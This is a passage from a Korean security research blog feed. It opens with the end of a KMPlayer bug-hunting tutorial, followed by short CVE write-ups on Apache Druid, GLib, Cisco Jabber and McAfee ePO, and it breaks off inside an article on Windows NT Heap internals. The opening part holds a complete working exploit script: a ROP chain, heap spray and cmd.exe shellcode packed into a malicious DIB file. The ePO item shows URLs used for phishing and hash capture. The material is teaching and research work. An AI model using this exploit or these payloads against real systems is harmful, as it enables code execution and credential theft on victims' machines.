OrderedDict<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_rop_chain</span>():</span><span class="hljs-comment"># rop chain generated with mona.py - www.corelan.be</span>rop_gadgets = [<span class="hljs-number">0x00453c50</span>, <span class="hljs-comment"># POP EDX # RETN [KMPlayer.exe]</span><span class="hljs-number">0x00d6a848</span>, <span class="hljs-comment"># ptr to &amp;VirtualProtect() [IAT KMPlayer.exe]</span><span class="hljs-number">0x0094eb72</span>, <span class="hljs-comment"># MOV EAX,DWORD PTR DS:[EDX] # RETN [KMPlayer.exe]</span><span class="hljs-number">0x007d2499</span>, <span class="hljs-comment"># XCHG EAX,ESI # RETN [KMPlayer.exe]</span><span class="hljs-number">0x00652cb0</span>, <span class="hljs-comment"># POP EBP # RETN [KMPlayer.exe]</span><span class="hljs-number">0x0042390c</span>, <span class="hljs-comment"># &amp; jmp esp [KMPlayer.exe]</span><span class="hljs-number">0x004c0267</span>, <span class="hljs-comment"># POP EBX # RETN [KMPlayer.exe]</span><span class="hljs-number">0x00000201</span>, <span class="hljs-comment"># 0x00000201-&gt; ebx</span><span class="hljs-number">0x0052d95d</span>, <span class="hljs-comment"># POP EDX # RETN [KMPlayer.exe]</span><span class="hljs-number">0x00000040</span>, <span class="hljs-comment"># 0x00000040-&gt; edx</span><span class="hljs-number">0x0082f8e0</span>, <span class="hljs-comment"># POP ECX # RETN [KMPlayer.exe]</span><span class="hljs-number">0x00d0aafc</span>, <span class="hljs-comment"># &amp;Writable location [KMPlayer.exe]</span><span class="hljs-number">0x009fc414</span>, <span class="hljs-comment"># POP EDI # RETN [KMPlayer.exe]</span><span class="hljs-number">0x00426485</span>, <span class="hljs-comment"># RETN (ROP NOP) [KMPlayer.exe]</span><span class="hljs-number">0x0068c402</span>, <span class="hljs-comment"># POP EAX # RETN [KMPlayer.exe]</span><span class="hljs-number">0x90909090</span>, <span class="hljs-comment"># nop</span><span class="hljs-number">0x00744e56</span>, <span class="hljs-comment"># PUSHAD # RETN [KMPlayer.exe]</span>]<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, _) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> rop_gadgets)<span class="hljs-comment">#shellcode for runnig cmd.exe</span>shellcode = <span class="hljs-string">&quot;\x90&quot;</span>*<span class="hljs-number">0x100</span>shellcode += <span class="hljs-string">&quot;\xda\xd2\xd9\x74\x24\xf4\x5d\x29\xc9\xba\xfb\xe4\x15&quot;</span>shellcode += <span class="hljs-string">&quot;\xba\xb1\x30\x31\x55\x17\x03\x55\x17\x83\x16\x18\xf7&quot;</span>shellcode += <span class="hljs-string">&quot;\x4f\x14\x09\x7a\xaf\xe4\xca\x1b\x39\x01\xfb\x1b\x5d&quot;</span>shellcode += <span class="hljs-string">&quot;\x42\xac\xab\x15\x06\x41\x47\x7b\xb2\xd2\x25\x54\xb5&quot;</span>shellcode += <span class="hljs-string">&quot;\x53\x83\x82\xf8\x64\xb8\xf7\x9b\xe6\xc3\x2b\x7b\xd6&quot;</span>shellcode += <span class="hljs-string">&quot;\x0b\x3e\x7a\x1f\x71\xb3\x2e\xc8\xfd\x66\xde\x7d\x4b&quot;</span>shellcode += <span class="hljs-string">&quot;\xbb\x55\xcd\x5d\xbb\x8a\x86\x5c\xea\x1d\x9c\x06\x2c&quot;</span>shellcode += <span class="hljs-string">&quot;\x9c\x71\x33\x65\x86\x96\x7e\x3f\x3d\x6c\xf4\xbe\x97&quot;</span>shellcode += <span class="hljs-string">&quot;\xbc\xf5\x6d\xd6\x70\x04\x6f\x1f\xb6\xf7\x1a\x69\xc4&quot;</span>shellcode += <span class="hljs-string">&quot;\x8a\x1c\xae\xb6\x50\xa8\x34\x10\x12\x0a\x90\xa0\xf7&quot;</span>shellcode += <span class="hljs-string">&quot;\xcd\x53\xae\xbc\x9a\x3b\xb3\x43\x4e\x30\xcf\xc8\x71&quot;</span>shellcode += <span class="hljs-string">&quot;\x96\x59\x8a\x55\x32\x01\x48\xf7\x63\xef\x3f\x08\x73&quot;</span>shellcode += <span class="hljs-string">&quot;\x50\x9f\xac\xf8\x7d\xf4\xdc\xa3\xeb\x0b\x52\xde\x5e&quot;</span>shellcode += <span class="hljs-string">&quot;\x0b\x6c\xe0\xce\x64\x5d\x6b\x81\xf3\x62\xbe\xe5\x0c&quot;</span>shellcode += <span class="hljs-string">&quot;\x29\xe2\x4c\x85\xf4\x77\xcd\xc8\x06\xa2\x12\xf5\x84&quot;</span>shellcode += <span class="hljs-string">&quot;\x46\xeb\x02\x94\x23\xee\x4f\x12\xd8\x82\xc0\xf7\xde&quot;</span>shellcode += <span class="hljs-string">&quot;\x31\xe0\xdd\xbd\xd8\x7a\xde&quot;</span>p = <span class="hljs-keyword">lambda</span> x : pack(<span class="hljs-string">&quot;&lt;L&quot;</span>, x)up = <span class="hljs-keyword">lambda</span> x : unpack(<span class="hljs-string">&quot;&lt;L&quot;</span>, x)[<span class="hljs-number">0</span>]rop_chain = create_rop_chain()BITMAPFILEHEADER = OrderedDict()BITMAPINFOHEADER = OrderedDict()BITMAPINFOHEADER[<span class="hljs-string">&#x27;biSize&#x27;</span>] = <span class="hljs-string">&#x27;\x28\x1f\x00\x00&#x27;</span> <span class="hljs-comment"># origin is 0x28</span>BITMAPINFOHEADER[<span class="hljs-string">&#x27;biWidth&#x27;</span>] = p(<span class="hljs-number">0x1c48</span>)BITMAPINFOHEADER[<span class="hljs-string">&#x27;biHeight&#x27;</span>] = p(<span class="hljs-number">0x1c48</span>)BITMAPINFOHEADER[<span class="hljs-string">&#x27;biPlanes&#x27;</span>] = <span class="hljs-string">&#x27;\x01\x00&#x27;</span>BITMAPINFOHEADER[<span class="hljs-string">&#x27;biBitCount&#x27;</span>] = <span class="hljs-string">&#x27;\x18\x00&#x27;</span>BITMAPINFOHEADER[<span class="hljs-string">&#x27;biCompression&#x27;</span>] = <span class="hljs-string">&#x27;\x00\x0a\x00\x00&#x27;</span> <span class="hljs-comment"># origin is 0x00</span>BITMAPINFOHEADER[<span class="hljs-string">&#x27;biSizeImage&#x27;</span>] = p(<span class="hljs-number">3</span> * (up(BITMAPINFOHEADER[<span class="hljs-string">&#x27;biWidth&#x27;</span>]) *up(BITMAPINFOHEADER[<span class="hljs-string">&#x27;biHeight&#x27;</span>])))BITMAPINFOHEADER[<span class="hljs-string">&#x27;biXPelsPerMeter&#x27;</span>] = <span class="hljs-string">&#x27;\x00\x00\x00\x00&#x27;</span>BITMAPINFOHEADER[<span class="hljs-string">&#x27;biYPelsPerMeter&#x27;</span>] = <span class="hljs-string">&#x27;\x00\x00\x00\x00&#x27;</span>BITMAPINFOHEADER[<span class="hljs-string">&#x27;biClrUsed&#x27;</span>] = <span class="hljs-string">&#x27;\x00\x02\x00\x00&#x27;</span> <span class="hljs-comment"># origin is 0x00</span>BITMAPINFOHEADER[<span class="hljs-string">&#x27;biClrImportant&#x27;</span>] = <span class="hljs-string">&#x27;\x00\x00\x00\x00&#x27;</span>BITMAPFILEHEADER[<span class="hljs-string">&#x27;bfType&#x27;</span>] = <span class="hljs-string">&#x27;BM&#x27;</span>BITMAPFILEHEADER[<span class="hljs-string">&#x27;bfsize&#x27;</span>] = p(up(BITMAPINFOHEADER[<span class="hljs-string">&#x27;biSizeImage&#x27;</span>]) + <span class="hljs-number">0x36</span>)BITMAPFILEHEADER[<span class="hljs-string">&#x27;bfReserved1&#x27;</span>] = <span class="hljs-string">&#x27;\x00\x00&#x27;</span>BITMAPFILEHEADER[<span class="hljs-string">&#x27;bfReserved2&#x27;</span>] = <span class="hljs-string">&#x27;\x00\x00&#x27;</span>BITMAPFILEHEADER[<span class="hljs-string">&#x27;bfOffBits&#x27;</span>] = <span class="hljs-string">&#x27;\x36\x00\x00\x00&#x27;</span>head = <span class="hljs-string">&#x27;Fandu_&#x27;</span>tail = <span class="hljs-string">&#x27;FANDU_&#x27;</span>spray = <span class="hljs-string">&#x27;\x11&#x27;</span>stack_to_heap = p(<span class="hljs-number">0x00523702</span>) <span class="hljs-comment"># PUSH ECX # POP ESP # POP ESI # POP EBX # RETN</span>heap_to_heap = p(<span class="hljs-number">0x0095ddef</span>) <span class="hljs-comment"># ADD ESP,19000 # POP EDI # POP ESI # POP EBX # RETN</span>pivot = p(<span class="hljs-number">0x00433712</span>) <span class="hljs-comment"># POP EDX # POP EDI # POP ESI # POP EBX # RETN</span>ret = p(<span class="hljs-number">0x00984e94</span>) <span class="hljs-comment"># RETN</span>offset1 = <span class="hljs-number">0x11111111</span> - <span class="hljs-number">0x101cb056</span> - <span class="hljs-number">0x600000</span> <span class="hljs-comment"># for calculating size of 0x11 spray</span>offset2 = <span class="hljs-number">0x197c0d11</span> - <span class="hljs-number">0x173772e1</span> - <span class="hljs-number">0x100000</span> <span class="hljs-comment"># for skip some data which are mutated</span>payload = <span class="hljs-string">&#x27;&#x27;</span>payload += head +<span class="hljs-string">&#x27;aa&#x27;</span>payload += spray * offset1payload += (heap_to_heap + stack_to_heap) * (<span class="hljs-number">0x400000</span> * <span class="hljs-number">2</span> / <span class="hljs-number">8</span>)payload += pivot * ((up(BITMAPINFOHEADER[<span class="hljs-string">&#x27;biSizeImage&#x27;</span>]) - len(payload) - offset2 - <span class="hljs-number">0x1000</span> - len(tail)) / <span class="hljs-number">4</span>)payload += ret * (<span class="hljs-number">0x20000</span> / <span class="hljs-number">4</span>)payload += rop_chainpayload += shellcodepayload += spray * (up(BITMAPINFOHEADER[<span class="hljs-string">&#x27;biSizeImage&#x27;</span>]) - len(payload)) <span class="hljs-comment">#dummy</span>payload += tailexploit = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> BITMAPFILEHEADER.keys() :exploit += BITMAPFILEHEADER[key]<span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> BITMAPINFOHEADER.keys() :exploit += BITMAPINFOHEADER[key]exploit += payloadf = open(<span class="hljs-string">&#x27;./exploit.dib&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>)f.write(exploit)f.close()</code></pre><p>그리고 이 파이썬 스크립트를 실행시켜 떨궈진 <code>exploit.dib</code> 파일을 KMPlayer에 넣어 실행하면!!!!</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--076.png" alt="bughunting-tutorials-part4/image--076.png"></p><p>이렇게 <code>cmd.exe</code>가 실행됩니다!!! 짝짝짝 ㅎㅎㅎㅎㅎㅎ</p><h1 id="그의-과거의-마지막-잡담"><a href="#그의-과거의-마지막-잡담" class="headerlink" title="그의 (과거의) 마지막 잡담"></a>그의 (과거의) 마지막 잡담</h1><p>으으 드디어 끝났네요 ㅋㅋ 원래 12 월 중순인가 말인가 시작했는 데 1 월에 멘탈이 나가 있어 가지고 이제야 끝났네요 후우… 역시 나 새끼는 게으른 놈….</p><p>원래 이 글을 쓴 이유가 동아리 후배들 교육시키기 위한 것도 있지만 사실 전에 cdpython 형이 이 취약점으로 버그헌팅 글 쓰면 좋을 거 같다고 해서 쓰게 됐습니다 ㅋㅋ 많은 분들에게 도움이 되었으면 좋겠네요. 사실 요즘 너무 잘하는 사람이 많아서 이런 거 보는 사람이 있겠냐만은… 잘하는 사람은 이거 보지도 않겠지… 쥬륵 나도 이제 잘해야지…. ㅋㅋㅋ 근데 일단 졸업부터 하즈아아아아 ㅠㅠㅠㅠ</p><p>그래도 제가 이 정도라도 할 수 있게 채찍질 해준 passket, combabo, cdpython, morinori89 형들 감사합니닼ㅋㅋㅋㅋㅋㅋㅋ 후우…. 사실 형들이랑 제일 많이 한 거는 해킹보다는 술 처먹는 거 같지만…. 그리고 문서 피드백 준 SSG 후배들 Frozenbeer 땡큐땡큐 ㅋㅋㅋ</p><p>그럼 다들 즐햌!!!</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>research</tag>
      
      <tag>bug hunting</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-25646: Apache Druid 원격 코드 실행 취약점</title>
    <link href="/2021/03/31/fabu1ous/2021-03-31/"/>
    <url>/2021/03/31/fabu1ous/2021-03-31/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://www.zerodayinitiative.com/blog/2021/3/25/cve-2021-25646-getting-code-execution-on-apache-druid">CVE-2021-25646 : Getting Code Execution on Apache Druid</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Apache Druid &lt;= 0.20.0</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Apache Druid는 Request를 통해 사용자 제공 JavaScript코드를 실행하는 기능이  있습니다. 이 기능은 신뢰도가 높은 환경에서 사용하기 위한 것이므로 기본적으로 비활성화되어 있습니다. 그러나 Druid 0.20.0 이전 버전에서는 서버 구성에 관계없이 사용자가 제공한 JavaScript 코드를 실행할 수 있는 취약점(CVE-2021-25646)이 발견되었습니다. 해커는 해당 취약점을 악용해 Druid 서버 프로세스의 권한으로 타겟 시스템에서 원격 코드실행을 할 수 있습니다. </p><p>CVE-2021-25646은 Apache Druid의 Jackson이 JavaScript 타입의 JSON 데이터 구문을 파싱하는 과정에서 발생합니다. </p><pre><code class="hljs java"><span class="hljs-meta">@JsonCreator</span> <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">JavaScriptDimFilter</span><span class="hljs-params">(<span class="hljs-meta">@JsonProperty(&quot;dimension&quot;)</span> String dimension, <span class="hljs-meta">@JsonProperty(&quot;function&quot;)</span> </span></span><span class="hljs-function"><span class="hljs-params">            String function, <span class="hljs-meta">@JsonProperty(&quot;extractionFn&quot;)</span> <span class="hljs-meta">@Nullable</span> ExtractionFn extractionFn, </span></span><span class="hljs-function"><span class="hljs-params">            <span class="hljs-meta">@JsonProperty(&quot;filterTuning&quot;)</span> <span class="hljs-meta">@Nullable</span> FilterTuning filterTuning, </span></span><span class="hljs-function"><span class="hljs-params">            <span class="hljs-meta">@JacksonInject</span> JavaScriptConfig config)</span> </span><span class="hljs-function"></span>&#123;   Preconditions.checkArgument(dimension != <span class="hljs-keyword">null</span>, <span class="hljs-string">&quot;dimension must not be null&quot;</span>);   Preconditions.checkArgument(function != <span class="hljs-keyword">null</span>, <span class="hljs-string">&quot;function must not be null&quot;</span>);   <span class="hljs-keyword">this</span>.dimension = dimension;   <span class="hljs-keyword">this</span>.function = function;   <span class="hljs-keyword">this</span>.extractionFn = extractionFn;   <span class="hljs-keyword">this</span>.filterTuning = filterTuning;   <span class="hljs-keyword">this</span>.config = config; &#125;</code></pre><p>JSON 데이터의  <code>name</code>속성이  “”일 때 빈 키값을 JavaScriptDimFilter 클래스의  <code>config</code>파라미터에 바인딩 시킬 수 있습니다. 따라서 해커는 JavaScript 실행 설정을 활성화하여 <code>function</code> 키값으로 제공한 JavaScript 코드를 실핼할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>apache</tag>
      
      <tag>javascript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-27219: GLib의 integer overflow 취약점</title>
    <link href="/2021/03/30/l0ch/2021-03-30/"/>
    <url>/2021/03/30/l0ch/2021-03-30/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2021-045-g_bytes_new/">GHSL-2021-045: Integer Overflow in GLib - CVE-2021-27219</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>테스트된 버전</p><ul><li>Ubuntu 20.04 (x86_64) : 버전 2.64.6-1</li><li>CentOS Stream (x86_64) : 버전 2.56.4-9</li><li>archlinux (x86_64) : 2.66.4-2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>64비트 플랫폼의 glib에서 암시적 형 변환으로 인한 integer overflow 취약점이 발견되어 세부 정보가 공개되었습니다.</p><p>취약점은 데이터로부터 <a href="https://developer.gnome.org/glib/stable/glib-Byte-Arrays.html#GBytes">GBytes</a> 객체를 생성하는 <a href="https://developer.gnome.org/glib/stable/glib-Byte-Arrays.html#g-bytes-new">g_bytes_new()</a> 함수에 존재합니다.</p><pre><code class="hljs jsx">GBytes * g_bytes_new (gconstpointer data, gsize size)&#123;  g_return_val_if_fail (data != NULL || size == <span class="hljs-number">0</span>, NULL);<span class="hljs-comment">//integer overflow</span>  <span class="hljs-keyword">return</span> g_bytes_new_take(g_memdup (data, size), size);  &#125;</code></pre><p>64bit 자료형인 <code>gsize</code> 형 <code>size</code>를 <code>g_memdup</code> 함수의 두 번째 인자로 사용합니다.</p><pre><code class="hljs c"><span class="hljs-comment">//g_memdup 함수 원형</span>g_memdup(gconstpointer mem, guint byte_size);</code></pre><p>그러나 <code>g_memdup</code>은 해당 인자를 32bit 자료형 <code>guint</code>으로 받아 암시적 형 변환이 이루어집니다. 이로 인해 훨씬 작은 데이터 버퍼를 포함하는 GBytes 객체를 반환하고 이는 memory corruption 취약점으로 이어질 수 있습니다.</p><p>해당 취약점의 패치 히스토리는 <a href="https://gitlab.gnome.org/GNOME/glib/-/merge_requests/1926/commits">https://gitlab.gnome.org/GNOME/glib/-/merge_requests/1926/commits</a> 에서 확인 가능합니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>integer overflow</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Cisco Jabber에서 발견된 5가지 취약점</title>
    <link href="/2021/03/29/idioth/2021-03-29/"/>
    <url>/2021/03/29/idioth/2021-03-29/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-cisco-jabber-PWrTATTC">Cisco Jabber Desktop and Mobile Client Software Vulnerabilities</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Cisco Jabber for Windows, MacOS, mobile Platforms</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>언제 어디서나 기기를 이용하여 직원의 상태 정보 확인 및 채팅, 음성 통화, 회의 등을 제공하는 UC 클라이언트인 Cisco Jabber에서 권한 상승 및 임의 프로그램 실행, 정보 유출(Information Disclosure), 네트워크 패킷 intercept, DoS 공격 등 여러 가지 취약점이 발견되었습니다.</p><p>각 취약점은 서로 연관성이 없으며 하나의 취약점에 영향을 받는 버전이라도 다른 취약점엔 영향을 받지 않을 수 있습니다. Certificate Validation을 제외한 취약점들은 Cisco Jabber의 잘못된 메시지 content 검증으로 인해 발생합니다. 이를 통해 해커는 조작된 <a href="https://ko.wikipedia.org/wiki/XMPP">XMPP</a> 메시지를 타깃 시스템에 전송하여 클라이언트를 실행 중인 사용자 권한으로 임의 프로그램 실행을 하거나, 프로그램의 인증 정보를 받아 오거나 서비스 거부 공격(Denial of Service)이 가능합니다.</p><p>또한 자격 증명에 대한 잘못된 유효성 검사로 인하여 네트워크 request를 가로채 조작된 인증서를 통해 클라이언트와 서버 간의 연결을 확인하거나 수정할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>idioth</tag>
      
      <tag>cisco</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-23888: McAfee ePolicy Orchestrator HTML Injection</title>
    <link href="/2021/03/28/insu/2021-03-28/"/>
    <url>/2021/03/28/insu/2021-03-28/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ricardojba.github.io/CVE-2021-23888-McAfee-ePolicy-Orchestrator-HTML-Injection/">CVE-2021-23888 - McAfee ePolicy Orchestrator HTML Injection</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>McAfee ePolicy Orchestrator</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>McAfee ePolicy Orchestrator 5.10 Update 10 이전 버전에서 검증되지 않은 client 측 URL redirect 취약점이 발견되었습니다. 이 취약점을 통해 인증된 ePO 사용자는 신뢰되지 않은 ePO IFRAME을 로드하여 인증된 사용자의 정보를 도용할 수 있습니다.</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>epo-host:<span class="hljs-number">8443</span><span class="hljs-regexp">/core/</span>orionNavigationLogin.<span class="hljs-keyword">do</span><span class="hljs-comment">#/core/orionDefaultPage.do</span></code></pre><p>위의 주소로 접근을 하게 되면 <code>/core/orionDefaultPage.do</code>가 IFRAME 내부에서 참조되는 것을 확인할 수 있습니다.</p><p>여러 시도를 통해 <a href="https://epo-host:8443/core/orionNavigationLogin.do#//google.com"><code>https://epo-host:8443/core/orionNavigationLogin.do#//google.com</code></a> google search page를 IFRAME에서 로드하는 것을 확인할 수 있습니다.</p><p>공격자는 <code>#</code> 뒤의 domain/URL을 바꾸어 victim에게 보내 피싱 공격을 할 수 있습니다.</p><p><img src="/2021/03/28/insu/2021-03-28/Untitled.png"></p><p>또한, host에서 실행되는 Responder-or-Inveigh를 가리키게 해 ePO 사용자의 NetNTM 해시를 얻을 수 있습니다.</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>epo-host:<span class="hljs-number">8443</span><span class="hljs-regexp">/core/</span>orionNavigationLogin.<span class="hljs-keyword">do</span><span class="hljs-comment">#//host-running-responder-or-inveigh</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>insu</tag>
      
      <tag>mcafee</tag>
      
      <tag>html injection</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 3 - NT Heap(2)</title>
    <link href="/2021/03/28/l0ch/pwncoolsexy-part3/"/>
    <url>/2021/03/28/l0ch/pwncoolsexy-part3/</url>
    
    <content type="html"><![CDATA[<h1 id="이전-시리즈-바로가기"><a href="#이전-시리즈-바로가기" class="headerlink" title="이전 시리즈 바로가기"></a>이전 시리즈 바로가기</h1><p><a href="https://hackyboiz.github.io/2021/01/31/l0ch/pwncoolsexy-part1/">Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 1 - pwntools for windows</a></p><p><a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/">Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 2 - NT Heap</a></p><hr><p>안녕하세요! 지난 폰쿨섹시 시리즈에 이어 오늘도 윈도우에 고통받고 있는 L0ch입니다! </p><p>시작하기 전에 근황 얘기를 조금 하자면 제 프로필 사진이 거지 같아졌습니다. 아니 비유가 아니라 말 그대로요… </p><p>어느 날 idioth 팀장형(이라 쓰고 독재자라고 읽는다)이 급하게 부르길래 무슨 일인가 했더니</p><blockquote><p>“야 너 지금 프로필 사진 별로다 내가 새로 그려줄까?”<br>“ㄴㄴ 나 지금 마음에 드는데”<br>“내가 마음에 안 들어 기다려봐ㅋ”<br>(10분 뒤)</p></blockquote><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled.png" alt="pwncoolsexy-part3/Untitled.png"></p><blockquote><p>“?”<br>“ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ 이걸로 함 팀장 권한으로 의견은 안 받음 ㅅㄱ”<br>“tq”</p></blockquote><p>팀장의 권력남용으로 제 의견은 단 1도 없이 프로필 사진을 변경당했어요. 마른하늘에 웬 날벼락이지 이게</p><p>알고 보니 저만 당한 게 아니었더라구요 ㅋ.ㅋ  이 형 우리 놀리려고 해킹하는 게 분명해..</p><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled%201.png" alt="pwncoolsexy-part3/Untitled%201.png"></p><blockquote><p>ㄹㅇ 똑같이 그려서 더 분하다</p></blockquote><p>이렇게 또 팀장 죽창 1스택을 쌓으며 쓴 이번 글에서는 Part 2에서 소개한 구조체를 NT Heap이 어떻게 써먹으면서 Heap 메모리를 할당하고 해제하는지 알아보겠습니다.. </p><h1 id="Allocate-in-NT-Heap"><a href="#Allocate-in-NT-Heap" class="headerlink" title="Allocate in NT Heap"></a>Allocate in NT Heap</h1><p>Heap 메모리 할당 요청이 들어오면 NT Heap의 메모리 할당 동작은 <code>RtlpAllocateHeap</code>에서 요청 크기에 따라 다음과 같이 세 가지로 나뉩니다.</p><ul><li>Size ≤ 0x4000</li><li>0x4000 &lt; Size ≤ 0xff000</li><li>Size &gt; 0xff000</li></ul><p><code>0xff000</code>은 <code>_Heap-&gt;VirtualMemoryThreshold &lt;&lt; 4</code> 의 값이며 가상 메모리 할당 기준값입니다. 또한 LFH는 크기가 <code>0x4000</code> 이하인 chunk만 관리한다고 이전 글에서 언급했었죠? 그래서 Non-LFH와 LFH의 할당 방식의 차이는 크기가 <code>0x4000</code>일 때만 고려하면 됩니다.</p><h2 id="Size-≤-0x4000"><a href="#Size-≤-0x4000" class="headerlink" title="Size ≤ 0x4000"></a>Size ≤ 0x4000</h2><p>요청 크기가 <code>0x4000</code>보다 작으면 먼저 LFH가 활성화되어 있는지 검사한 뒤 활성화 여부에 따라 할당 방법을 결정합니다.</p><h3 id="LFH-Disabled"><a href="#LFH-Disabled" class="headerlink" title="LFH Disabled"></a>LFH Disabled</h3><ol><li>LFH가 비활성화되어 있으면 <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP">_HEAP-&gt;FrontEndHeapUsageData</a>에 <code>0x21</code>을 더한 뒤, 해당 값이 <code>0xff00</code> 또는 <code>(&amp; 0x1f)</code>결과가 <code>0x10</code> 보다 큰지 검사합니다.<ul><li>조건을 만족하면 LFH를 활성화해 다음 chunk부터는 LFH로 할당됩니다.</li></ul></li><li>먼저 <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-LIST-LOOKUP">_HEAP_LIST_LOOKUP-&gt;ListHint</a>에 요청된 크기의 chunk가 있는지 확인하고 적절한 크기의 ListHint가 있으면 chunk를 가져와 할당합니다.</li><li>적절한 크기의 chunk가 없으면 요청된 크기보다 더 큰 크기의 ListHint에서 가져온 chunk를 분할하고, 분할하고 남은 chunk를 <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#FreeLists-HEAP-ENTRY">FreeList</a>에 삽입하고 ListHint에 넣습니다.</li><li>FreeList에 적절한 chunk가 없으면 <code>ExtendHeap</code>으로 Heap space를 확장해 chunk를 가져와 할당합니다.</li></ol><h3 id="LFH-Enabled"><a href="#LFH-Enabled" class="headerlink" title="LFH Enabled"></a>LFH Enabled</h3><p>LFH가 활성화된 상태에서는 <code>RtlpLowFragHeapAllocFromContext</code> 함수에서 다음과 같은 과정으로 할당됩니다.</p><ol><li><a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-LOCAL-SEGMENT-INFO">_HEAP_LOCAL_SEGMENT_INFO-&gt;ActiveSubsegment</a>가 가리키는 Subsegment의 depth를 확인해 할당 가능한 chunk가 있는지 보고, 없으면 <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-LOCAL-SEGMENT-INFO">_HEAP_LOCAL_SEGMENT_INFO-&gt;CachedItems</a> 에서 검색합니다.</li><li><code>CachedItems</code>에서 검색한 경우 <code>ActiveSubsegment</code>를 <code>CachedItem</code>의 Subsegment로 바꿉니다.</li><li><code>_HEAP_LOCAL_SEGMENT_INFO-&gt;ActiveSubsegment-&gt;AggregateExchg-&gt;Depth</code> 값을 1 감소합니다.</li><li><code>0x0-0x7f</code> 사이의 랜덤 값들로 채워진 256 bytes 배열인 <code>RtlpLowFragHeapRandomData[x]</code> 에서 임의의 1 bytes 값을 읽어 Heap chunk의 인덱스로 사용합니다.</li><li><a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-USERDATA-HEADER">_HEAP_USERDATA_HEADER-&gt;BusyBitmap</a> 비트맵에서 읽어온 인덱스 위치에 chunk를 할당할 수 있는지 확인하고 할당합니다. 할당이 불가능하면 인접한 위치의 다른 index를 찾습니다.</li></ol><h2 id="0x4000-lt-Size-≤-0xff000"><a href="#0x4000-lt-Size-≤-0xff000" class="headerlink" title="0x4000 &lt; Size ≤ 0xff000"></a>0x4000 &lt; Size ≤ 0xff000</h2><p>LFH가 비활성화된 <code>0x4000</code> 이하 크기의 할당 프로세스와 동일합니다. 간단하죠? </p><h2 id="Size-gt-0xff000"><a href="#Size-gt-0xff000" class="headerlink" title="Size &gt; 0xff000"></a>Size &gt; 0xff000</h2><p>요청 사이즈가 <code>0xff000</code>보다 클 경우 <code>ZwAllocateVirtualMemory()</code>라는 가상 메모리 할당 함수를 사용해 메모리를 할당하며, 해당 chunk는 <code>_HEAP_ENTRY</code> 대신 <code>_HEAP_VIRTUAL_ALLOC_ENTRY</code> 구조체가 header가 됩니다. </p><h1 id="Free-in-NT-Heap"><a href="#Free-in-NT-Heap" class="headerlink" title="Free in NT 